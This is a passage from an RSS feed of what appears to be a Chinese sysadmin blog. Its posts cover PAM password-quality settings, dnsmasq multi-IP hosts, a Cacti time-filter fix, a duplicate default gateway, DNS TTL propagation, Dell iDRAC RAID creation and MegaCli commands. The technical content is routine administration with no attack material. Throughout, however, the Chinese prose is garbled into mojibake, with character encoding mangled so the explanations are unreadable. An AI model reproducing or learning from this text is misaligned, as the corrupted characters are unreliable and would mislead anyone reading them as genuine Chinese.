&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åé¢åŠ ä¸Šï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;minlen&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;12&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;lcredit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-1 &lt;span class=&#34;nv&#34;&gt;ucredit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-1 &lt;span class=&#34;nv&#34;&gt;dcredit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-1 &lt;span class=&#34;nv&#34;&gt;ocredit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-1 enforce_for_root
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¿®æ”¹æˆä¸ºï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;password    requisite     pam_pwquality.so try_first_pass local_users_only &lt;span class=&#34;nv&#34;&gt;retry&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;authtok_type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;minlen&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;12&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;lcredit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-1 &lt;span class=&#34;nv&#34;&gt;ucredit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-1 &lt;span class=&#34;nv&#34;&gt;dcredit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-1 &lt;span class=&#34;nv&#34;&gt;ocredit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-1 enforce_for_root
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ„æ€æ˜¯ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;å¯†ç é•¿åº¦12ï¼Œé¡»åŒ…å«ï¼šä¸€ä¸ªå°å†™å­—ç¬¦ï¼Œä¸€ä¸ªå¤§å†™å­—ç¬¦ï¼Œä¸€ä¸ªæ•°å­—ï¼Œä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ï¼Œå¼ºåˆ¶rootä¹Ÿéµå®ˆæ­¤è§„åˆ™
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å‚æ•°å…¨éƒ¨è§£é‡Šå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;retry&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;3: This option will prompt the user &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;times&lt;/span&gt; before exiting and returning an error.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;minlen&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;12: This specifies that the password cannot be less than &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt; characters.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;maxrepeat&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;3: This allows implies that only a maximum of &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; repeated characters can be included in the password.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;ucredit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-1: The option requires at least one uppercase character in the password.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;lcredit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-1: The option requires at least one lowercase character in the password.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;dcredit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-1: This implies that the password should have at last a numeric character.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;ocredit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-1: The option requires at least one special character included in the password.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;difok&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;3: This implies that only a  maximum of &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; character changes in the new password should be present in the old password.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;reject_username: The option rejects a password &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; it consists of the username either in its normal way or in reverse.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;enforce_for_root: This ensures that the password policies are adhered to even &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; itâ€™s the root user configuring the passwords.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>Dnsmasqé…ç½®ä¸€ä¸ªåŸŸåå¯¹åº”å¤šä¸ªip</title>
      <link>https://rendoumi.com/posts/20221219-dnsmqsq_multi_ip/</link>
      <pubDate>Sun, 18 Dec 2022 09:03:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20221219-dnsmqsq_multi_ip/</guid>
      <description>&lt;p&gt;ä¸€ï¼šä»‹ç»ï¼š
DNSMasqä¸»è¦ç”¨æ¥è§£å†³å†…ç½‘DNSåŸŸåç¼“å­˜ã€DHCPã€ç½‘ç»œå¯åŠ¨å’Œè·¯ç”±é€šå‘ŠåŠŸèƒ½ï¼Œæˆ‘ä»¬ä¸»è¦æ˜¯å°†DNSMasqä½œä¸ºå†…ç½‘DNSåŸŸååŠ«æŒä½¿ç”¨&lt;/p&gt;
&lt;p&gt;ç³»ç»Ÿç¯å¢ƒï¼šcentos7.6
éœ€æ±‚ï¼šä¸€ä¸ªåŸŸåå¯¹åº”å¤šä¸ªip
ä¸»æœºipï¼šï¼ˆå†…ç½‘ä¸»æœº172.18.30.1å’Œ172.18.30.2ï¼‰&lt;/p&gt;
&lt;p&gt;äºŒï¼šé…ç½®æ–¹æ³•
1ï¼Œæ·»åŠ å¦‚ä¸‹é…ç½®åˆ°/etc/dnsmasq.conf
addn-hosts=/etc/ty.ddky.local&lt;/p&gt;
&lt;p&gt;addn-hostsï¼šå¦‚æœè¦æ”¯æŒä¸€ä¸ªåŸŸåå¯¹åº”å¤šä¸ª IPï¼Œå°±å¿…é¡»ç”¨ addn-hosts é€‰é¡¹&lt;/p&gt;
&lt;p&gt;2ï¼Œ/etc/ty.ddky.local æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š
172.18.33.100  ty.ddky.local
172.18.33.104  ty.ddky.local&lt;/p&gt;
&lt;p&gt;3ï¼Œä¿®æ”¹å®Œæˆåé‡å¯ DNSMasq
systemctl restart dnsmasq.service&lt;/p&gt;</description>
    </item>
    <item>
      <title>è€ç‰ˆæœ¬cactiçš„å›¾å½¢filterçªç„¶å¤±æ•ˆçš„è§£å†³åŠæ³•</title>
      <link>https://rendoumi.com/posts/20221218-cacti_time_filter/</link>
      <pubDate>Sun, 18 Dec 2022 09:03:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20221218-cacti_time_filter/</guid>
      <description>&lt;p&gt;ç½‘ç»œå·¥ç¨‹å¸ˆé€‰æ‹©ç½‘ç»œè®¾å¤‡çš„ç›‘æ§å·¥å…·æ˜¯è€ç‰Œçš„cactiï¼Œå½“ç„¶ä½œä¸ºç³»ç»Ÿå·¥ç¨‹å¸ˆçš„æˆ‘ï¼Œè¿˜æ˜¯è§‰å¾—librenmsæ˜¯ä¸ªå¥½é€‰æ‹©ï¼Œä½†æ˜¯ï¼Œlibrenmsä¼šå¯¹ç½‘ç»œè®¾å¤‡cpué€ æˆæ¯”è¾ƒå¤§çš„å‹åŠ›ã€‚é‚£è¿˜æ˜¯éµä»ä»–çš„é€‰æ‹©ï¼Œæœ€è¿‘ç½‘å·¥æŠ¥å‘Šè¯´ï¼š&lt;/p&gt;
&lt;p&gt;é€‰æ‹©å›¾å½¢çš„æ—¶å€™æ—¶é—´Filterå¤±æ•ˆäº†ã€‚é€‰æ‹©äº†ä»¥åå›¾å½¢æ— å˜åŒ–ï¼Œå´©æºƒï¼ŒæŸ¥äº†ä¸€ä¸‹ï¼Œéƒ½ä¸Šå¤çš„ç©æ„äº†ã€‚&lt;/p&gt;
&lt;p&gt;ä¿®æ”¹æ–¹æ³•ï¼š&lt;/p&gt;
&lt;p&gt;ä¿®æ”¹graph_image.php&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20221218-cacti_time_filter/2021-01-20_190434.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;unixtime = 1600000000ï¼Œä¹Ÿå°±æ˜¯åˆ° 2020-09-13 20:26:40ã€‚æ”¾å¤§åˆ° 2600000000ï¼Œä¹Ÿå°±æ˜¯åˆ°2052-05-22 22:13:20ï¼Œå†™è¿™ä¸ªphpç¨‹åºçš„äººé˜²è¶Šç•Œï¼Œå´æ²¡æƒ³åˆ°æ—¶é—´çœŸçš„æ¥åˆ°äº†è¿™ä¸ªèŠ‚ç‚¹ã€‚&lt;/p&gt;
&lt;p&gt;æ³¨ï¼šUnix æ—¶é—´æˆ³æ˜¯ä»1970å¹´1æœˆ1æ—¥ï¼ˆUTC/GMTçš„åˆå¤œï¼‰å¼€å§‹æ‰€ç»è¿‡çš„ç§’æ•°ï¼Œä¸è€ƒè™‘é—°ç§’ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>çº¿ä¸ŠæœåŠ¡å™¨å‡ºç°å¤šç½‘å…³é—®é¢˜çš„å¤„ç†</title>
      <link>https://rendoumi.com/posts/20221218-multi_gateway/</link>
      <pubDate>Sun, 18 Dec 2022 09:02:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20221218-multi_gateway/</guid>
      <description>&lt;p&gt;çº¿ä¸ŠæœåŠ¡å™¨172.18.30.67 æœ‰4ä¸ªç½‘å£&lt;/p&gt;
&lt;p&gt;å…¶ä¸­eno1å’Œeno2æ˜¯ä¸¤ä¸ªå…‰çº¤ä¸‡å…†å£ï¼Œenp26s0f0å’Œenp26s0f1æ˜¯ä¸¤ä¸ªä»¥å¤ªåƒå…†ç½‘å£ã€‚&lt;/p&gt;
&lt;p&gt;eno2ç½‘å¡åœ¨æ²¡åšbondingçš„æ—¶å€™ï¼Œé€šè¿‡NetworkManagerçš„dhcpè·å¾—äº†åœ°å€ã€‚ç„¶åeno1å’Œeno2åšäº†bondingï¼Œä½†æ˜¯eno2å®é™…è¿˜åœ¨å•ç‹¬èµ·ä½œç”¨ï¼Œbondingååœ°å€æ²¡å»æ‰ï¼Œå¯¼è‡´æœ‰ä¸¤ä¸ªç½‘å…³ã€‚è·¯ç”±è¡¨å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[root@renhe-18-30-67 ~]# ip r
default via 172.18.29.254 dev eno2 
default via 172.18.31.254 dev br0.199 proto static metric 426 
172.18.28.0/23 dev eno2 proto kernel scope link src 172.18.28.67 
172.18.30.0/23 dev br0.199 proto kernel scope link src 172.18.30.67 metric 426 
192.168.122.0/24 dev virbr0 proto kernel scope link src 192.168.122.1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;eno2æ˜¯ä»dhcpè·å¾—äº†172.18.28.67çš„åœ°å€&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ip a
eno2: flags=6211&amp;lt;UP,BROADCAST,RUNNING,SLAVE,MULTICAST&amp;gt;  mtu 1500
        inet 172.18.28.67  netmask 255.255.254.0  broadcast 172.18.29.255
        ether b4:05:5d:08:e0:d8  txqueuelen 1000  (Ethernet)
        RX packets 81768780  bytes 5398659503 (5.0 GiB)
        RX errors 0  dropped 7  overruns 0  frame 0
        TX packets 10044620  bytes 467566304 (445.9 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;è¿™ç§æƒ…å†µä¸‹ï¼Œå¤„ç†æ–¹æ³•å¦‚ä¸‹ï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>114dnsçš„ttlè¶…æ—¶çš„æ•™è®­</title>
      <link>https://rendoumi.com/posts/20221218-dns_114/</link>
      <pubDate>Sun, 18 Dec 2022 09:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20221218-dns_114/</guid>
      <description>&lt;p&gt;114.114.114.114 è¿™ä¸ªDNSä¿®æ”¹è®°å½•ç­‰å¾…çš„ç”Ÿæ•ˆæ—¶é—´éå¸¸çš„é•¿ï¼Œè¿œè¿œè¶…å‡ºäº†TTLçš„æ—¶é•¿ï¼ŒåŸºæœ¬æ˜¯ä½ è®¾ç½®TTLæ—¶é—´çš„6å€ã€‚&lt;/p&gt;
&lt;p&gt;è¿™æ˜¯ä¸Šæ¬¡æˆ‘ä»¬å‰²æ¥å¾—åˆ°çš„æ•™è®­å•Šã€‚æˆ‘ä»¬è¦å‰²æ¥m.ddky.comçš„åŸŸåã€‚&lt;/p&gt;
&lt;p&gt;æ³¨ï¼šåœ¨ä¿®æ”¹m.ddky.comçš„è®°å½•å‰ï¼Œå·²ç»æŠŠddky.comçš„m.ddky.comçš„TTLæ”¹æˆäº†1åˆ†é’Ÿï¼Œæ­£å¸¸çš„æ¥è¯´ï¼Œç¬¬ä¸€è½®1åˆ†é’Ÿå†…ä¸æ›´æ–°ï¼Œç¬¬äºŒè½®2åˆ†é’Ÿå†…ä¹Ÿåº”è¯¥æ›´æ–°äº†ã€‚&lt;/p&gt;
&lt;p&gt;çœ‹ä¸‹å›¾ï¼Œåœ¨å¸¦å¤–æœºä¸Šåšçš„æŸ¥è¯¢ï¼ŒæŸ¥è¯¢çš„æ—¶å€™8.8.8.8å’Œ223.5.5.5éƒ½å·²ç»ç”Ÿæ•ˆäº†ï¼Œå˜æˆäº†å¸è”çš„åœ°å€ã€‚&lt;/p&gt;
&lt;p&gt;06:06:57 åšäº†æŸ¥è¯¢ï¼Œå»æ‰å°æ—¶ï¼Œ06ï¼š57å®šä¹‰ä¸ºèµ·å§‹æ—¶é—´ã€‚
&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20221218-dns_114/%E9%80%89%E5%8C%BA_480_1593442420.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20221218-dns_114/%E9%80%89%E5%8C%BA_481_1593442678.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20221218-dns_114/%E9%80%89%E5%8C%BA_482_1593442695.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20221218-dns_114/%E9%80%89%E5%8C%BA_483_1593442708.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20221218-dns_114/%E9%80%89%E5%8C%BA_484_1593442728.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä¸€ç›´åˆ° 12:22 åˆ†è¿˜æ²¡æœ‰å˜è¿‡æ¥ï¼Œå¤§æ¦‚ 13:00 å˜è¿‡æ¥&lt;/p&gt;
&lt;p&gt;èµ·å§‹ 06:57 &amp;ndash; 13:00 ï¼Œä¸€å…±ç”¨äº†6åˆ†é’Ÿã€‚è€ŒTTLæ˜¯1åˆ†é’Ÿï¼Œæ‰€ä»¥åŸºæœ¬æ˜¯6å€æ—¶é—´ã€‚&lt;/p&gt;
&lt;p&gt;å¾€å‰æ¨æµ‹5æœˆ25æ—¥çš„DNSå‰²æ¥ï¼ŒTTLæ˜¯10åˆ†é’Ÿï¼Œ6å€ï¼Œå°±æ˜¯60åˆ†é’Ÿï¼ŒåŸºæœ¬å»åˆã€‚&lt;/p&gt;
&lt;h1 id=&#34;å¦‚æœæƒ³è®©dnså°½å¿«ç”Ÿæ•ˆttlæ”¹æˆ10ç§’æ˜¯æé™äº†&#34;&gt;å¦‚æœæƒ³è®©DNSå°½å¿«ç”Ÿæ•ˆï¼ŒTTLæ”¹æˆ10ç§’æ˜¯æé™äº†ã€‚&lt;/h1&gt;</description>
    </item>
    <item>
      <title>DellæœåŠ¡å™¨ç”¨sshæ–¹å¼åˆ’åˆ†ç£ç›˜Raidçš„æ–¹æ³•</title>
      <link>https://rendoumi.com/posts/20221219-dell_ssh_raid/</link>
      <pubDate>Sun, 18 Dec 2022 09:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20221219-dell_ssh_raid/</guid>
      <description>&lt;p&gt;é¦–å…ˆsshåˆ°idracå»ï¼Œç›´æ¥ä¼šè¿›å…¥racadmçš„ç•Œé¢&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬ä»¥2022å¹´æœ€æ–°çš„dellæœºå™¨ä¸ºä¾‹ï¼Œè€çš„æœºå™¨æ˜¾ç¤ºçš„ä¸œè¥¿ä¸ä¸€è‡´&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ssh 10.18.30.104
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Password: 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;racadm&amp;gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„ï¼Œshellå‘½ä»¤æœ‰è‡ªåŠ¨è¡¥å…¨åŠŸèƒ½ï¼ŒæŒ‰ä¸¤ä¸‹tabé”®ä¼šè‡ªåŠ¨è¡¥&lt;/p&gt;
&lt;p&gt;åšraidçš„å…¨éƒ¨å‘½ä»¤éƒ½åœ¨storageçš„å­å‘½ä»¤ä¸‹&lt;/p&gt;
&lt;p&gt;ä¸€ã€é¦–å…ˆæ‹¿åˆ°raidå¡çš„åç§°ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;racadm&amp;gt;&amp;gt;storage get controllers
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;RAID.Slot.1-1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;AHCI.Embedded.2-1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;AHCI.Embedded.1-1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;RAID.Slot.1-1 æ˜¯Raidå¡æ§åˆ¶å™¨åç§°ï¼Œä¸‹é¢ä¸¤ä¸ªæ˜¯ä¸»æ¿å†…ç½®çš„ï¼Œå¿½ç•¥ã€‚&lt;/p&gt;
&lt;p&gt;äºŒã€ç„¶åæ‹¿åˆ°æ‰€æœ‰ç‰©ç†ç›˜çš„åç§°ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;racadm&amp;gt;&amp;gt;storage get pdisks
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Disk.Bay.0:Enclosure.Internal.0-1:RAID.Slot.1-1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Disk.Bay.1:Enclosure.Internal.0-1:RAID.Slot.1-1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Disk.Bay.2:Enclosure.Internal.0-1:RAID.Slot.1-1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Disk.Bay.3:Enclosure.Internal.0-1:RAID.Slot.1-1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸‰ã€çœ‹çœ‹æœ‰æ²¡æœ‰å·²ç»åšå¥½çš„è™šæ‹Ÿç£ç›˜&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;racadm&amp;gt;&amp;gt;storage get vdisks
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æ˜¾ç¤ºä¸ºç©ºï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥æ”¾å¿ƒå¤§èƒ†çš„å»åšäº†&lt;/p&gt;
&lt;p&gt;å››ã€åˆ’åˆ†RAID
æ ¹æ®çº§åˆ«ä¸åŒï¼Œç²¾ç®€è¿‡çš„åä»¤å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;racadm storage createvd:&amp;lt;æ§åˆ¶å™¨&amp;gt; -rl &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;r0&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;r1&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;r5&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;r6&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;r10&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;r50&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;r60&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; -pdkey:&amp;lt;ç£ç›˜ç»„ï¼Œç”¨é€—å·åˆ†å‰²&amp;gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-rl â€” Sets the storage level.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    r0 â€” storage 0-Striping
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    r1 â€” storage 1-Mirroring
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    r5 â€” storage 5-Striping with Parity
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    r6 â€” storage 6-Striping with Extra Parity
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    r10 â€” storage 10-Spanned Striping with Mirroring
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    r50 â€” storage 50-Spanned Striping with Parity
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    r60 â€” storage 60-Spanned Striping with Extra Parity
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç»™å‡ºä¾‹å­ï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>Megacliæ“ä½œç£ç›˜çš„å¸¸ç”¨å‘½ä»¤</title>
      <link>https://rendoumi.com/posts/20221217-megacli/</link>
      <pubDate>Sat, 17 Dec 2022 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20221217-megacli/</guid>
      <description>&lt;p&gt;è¿™Megacliæ˜¯æ“ä½œç£ç›˜Raidçš„å¸¸ç”¨è½¯ä»¶ï¼Œæ—¥å¸¸ç”¨çš„å¤§å¤šæ˜¯dellå®¶çš„æœºå™¨ï¼Œéƒ½æ˜¯è¿™è½¯ä»¶ï¼Œè®°å½•ä¸€ä¸‹ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#!/bin/sh
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#/opt/MegaRAID/MegaCli/MegaCli64 -PDList -a0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/opt/MegaRAID/MegaCli/MegaCli64 -PDList -a0 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep -A1 &lt;span class=&#34;s2&#34;&gt;&amp;#34;Enclosure Device&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# clear foreign disk &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#/opt/MegaRAID/MegaCli/MegaCli64 -cfgforeign -scan -a0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#/opt/MegaRAID/MegaCli/MegaCli64 -cfgforeign -clear -a0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# clear Firmware state&lt;/span&gt;
